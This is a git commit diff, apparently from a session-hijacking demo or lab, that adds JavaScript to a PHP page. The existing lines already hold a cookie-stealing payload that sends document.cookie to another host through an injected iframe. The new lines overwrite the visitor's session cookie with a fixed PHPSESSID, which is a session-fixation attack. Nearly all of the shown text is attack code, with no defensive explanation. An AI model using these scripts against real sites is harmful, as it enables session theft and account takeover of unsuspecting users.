7f40938c716e95884f2263df6297222349db7289
Melai Deogracias <kmcdeogracias@gmail.com>
2017-07-03 20:16:35 +0800

    Add script that will overwrite session cookie

--- public/session/get_session.php
+++ public/session/get_session.php
@@ -6,4 +6,8 @@
 	<script type="text/javascript">
 		document.write("<iframe src = 'http://0.0.0.0:8003/session/get_session.php?" + document.cookie + "'></iframe>");
 	</script>
+
+	<script type="text/javascript">
+		document.cookie="PHPSESSID=n3av9fbluh2chtmbqivuuadu22";
+	</script>
 -->
